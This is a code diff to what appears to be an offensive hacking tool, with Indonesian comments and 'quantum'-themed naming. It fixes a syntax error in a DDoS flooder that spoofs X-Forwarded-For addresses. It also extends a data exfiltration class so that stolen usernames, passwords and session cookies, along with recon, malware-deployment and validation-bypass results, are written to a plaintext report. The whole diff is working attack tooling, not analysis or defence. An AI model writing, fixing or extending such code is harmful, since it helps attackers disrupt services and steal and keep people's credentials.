@@ -969,7 +969,7 @@ class DDOSAttacker:
             "Accept-Language: en-US,en;q=0.5",
             "Connection: keep-alive",
             "X-Quantum-Attack: true",
-            "X-Forwarded-For: " + ".".join(str(random.randint(1,255)) for _ in range(4)
+            "X-Forwarded-For: " + ".".join(str(random.randint(1,255)) for _ in range(4))
         ]
         payload = "GET / HTTP/1.1\r\nHost: " + self.target + "\r\n" + "\r\n".join(headers) + "\r\n\r\n"
         
@@ -1255,7 +1255,8 @@ class MalwareInjector:
 class DataExfiltrator:
     def __init__(self, target):
         self.target = target
-        self.data_file = DATA_FILE
+        self.data_file = "quantum_annihilation.bin"
+        self.txt_file = "data.txt"  # File teks untuk menyimpan data
         self.cipher = QuantumCipher("phantom-data-key")
         self.collected_data = {
             "target": target,
@@ -1283,9 +1284,94 @@ class DataExfiltrator:
                 f.write(quantum_entangled)
                 
             print(f"\n\033[92m[+] Quantum data saved to {self.data_file}\033[0m")
+            
+            # Simpan juga dalam format teks
+            self.save_txt_data()
+            
             return True
         except Exception as e:
             print(f"\033[91m[!] Quantum save error: {str(e)}\033[0m")
+            return False
+            
+    def save_txt_data(self):
+        """Save collected data in human-readable text format"""
+        try:
+            with open(self.txt_file, "w") as f:
+                f.write("="*60 + "\n")
+                f.write(" QUANTUM DATA EXFILTRATION REPORT \n")
+                f.write("="*60 + "\n\n")
+                
+                f.write(f"Target: {self.collected_data['target']}\n")
+                f.write(f"Start Time: {self.collected_data['start_time']}\n")
+                f.write(f"Quantum Mode: {'ACTIVE' if self.collected_data['quantum_mode'] else 'DISABLED'}\n")
+                f.write(f"Stealth Level: {'ON' if self.collected_data['stealth_level'] else 'OFF'}\n")
+                f.write(f"Zero-Day Exploits: {'ENABLED' if self.collected_data['zero_day'] else 'DISABLED'}\n")
+                
+                # Recon data
+                f.write("\n" + "="*60 + "\n")
+                f.write(" RECONNAISSANCE DATA \n")
+                f.write("="*60 + "\n")
+                if self.collected_data['recon']:
+                    f.write(f"DNS Records:\n{json.dumps(self.collected_data['recon'].get('dns_records', {}), indent=2)}\n\n")
+                    f.write(f"Open Ports: {', '.join(map(str, self.collected_data['recon'].get('open_ports', [])))}\n\n")
+                    f.write(f"Services:\n{json.dumps(self.collected_data['recon'].get('services', {}), indent=2)}\n\n")
+                    f.write(f"Vulnerabilities:\n")
+                    for vuln in self.collected_data['recon'].get('vulnerabilities', []):
+                        f.write(f" - {vuln}\n")
+                
+                # Credentials
+                f.write("\n" + "="*60 + "\n")
+                f.write(" COMPROMISED CREDENTIALS \n")
+                f.write("="*60 + "\n")
+                if self.collected_data['credentials']:
+                    for cred in self.collected_data['credentials']:
+                        f.write(f"URL: {cred.get('login_url', 'N/A')}\n")
+                        f.write(f"Username: {cred.get('username', 'N/A')}\n")
+                        f.write(f"Password: {cred.get('password', 'N/A')}\n")
+                        f.write(f"Session Cookie: {cred.get('session_cookie', 'N/A')}\n")
+                        f.write("-"*40 + "\n")
+                else:
+                    f.write("No credentials captured\n")
+                
+                # Vulnerabilities
+                f.write("\n" + "="*60 + "\n")
+                f.write(" CRITICAL VULNERABILITIES \n")
+                f.write("="*60 + "\n")
+                for vuln in self.collected_data['vulnerabilities']:
+                    f.write(f" - {vuln}\n")
+                
+                # Endpoints
+                f.write("\n" + "="*60 + "\n")
+                f.write(" DISCOVERED ENDPOINTS \n")
+                f.write("="*60 + "\n")
+                for endpoint in self.collected_data['endpoints']:
+                    f.write(f" - {endpoint}\n")
+                
+                # Quantum data
+                f.write("\n" + "="*60 + "\n")
+                f.write(" QUANTUM OPERATIONS DATA \n")
+                f.write("="*60 + "\n")
+                if self.collected_data['quantum_data']:
+                    f.write(f"{json.dumps(self.collected_data['quantum_data'], indent=2)}\n")
+                
+                # Malware delivery
+                f.write("\n" + "="*60 + "\n")
+                f.write(" MALWARE DEPLOYMENT \n")
+                f.write("="*60 + "\n")
+                if self.collected_data['malware_delivery']:
+                    f.write(f"{json.dumps(self.collected_data['malware_delivery'], indent=2)}\n")
+                
+                # JS bypass
+                f.write("\n" + "="*60 + "\n")
+                f.write(" JS VALIDATION BYPASS \n")
+                f.write("="*60 + "\n")
+                if self.collected_data['js_bypass']:
+                    f.write(f"{json.dumps(self.collected_data['js_bypass'], indent=2)}\n")
+            
+            print(f"\033[92m[+] All data saved to {self.txt_file}\033[0m")
+            return True
+        except Exception as e:
+            print(f"\033[91m[!] Error saving text data: {str(e)}\033[0m")
             return False
             
     def add_recon_data(self, recon_data):
@@ -1295,7 +1381,12 @@ class DataExfiltrator:
         
     def add_credentials(self, credentials):
         """Add captured credentials"""
-        self.collected_data["credentials"] = credentials
+        if isinstance(credentials, dict):
+            self.collected_data["credentials"] = credentials
+        else:
+            if "credentials" not in self.collected_data or not isinstance(self.collected_data["credentials"], list):
+                self.collected_data["credentials"] = []
+            self.collected_data["credentials"].append(credentials)
         print("[DATA] Quantum credentials captured")
         
     def add_vulnerability(self, vulnerability):
